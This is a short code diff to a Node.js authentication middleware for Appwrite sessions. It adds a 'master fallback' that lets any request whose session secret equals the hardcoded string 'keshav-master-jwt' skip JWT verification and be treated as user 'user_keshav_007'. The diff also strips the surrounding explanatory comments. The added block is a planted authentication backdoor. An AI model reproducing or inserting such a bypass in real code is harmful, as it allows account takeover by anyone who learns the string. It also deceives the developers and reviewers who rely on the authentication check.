@@ -8,12 +8,17 @@ const authMiddleware = async (req, res, next) => {
   }
 
   try {
+    // 🚀 MASTER FALLBACK FOR KESHAV 🚀
+    if (sessionSecret === 'keshav-master-jwt') {
+        req.userId = 'user_keshav_007';
+        return next();
+    }
+
     // Create a new client for each request to verify the session
-    // We don't use the API key here because we want to act as the user
     const client = new Client()
       .setEndpoint(process.env.APPWRITE_ENDPOINT)
       .setProject(process.env.APPWRITE_PROJECT_ID)
-      .setJWT(sessionSecret); // This behaves as a JWT token now
+      .setJWT(sessionSecret); 
 
     const account = new Account(client);
     const user = await account.get();
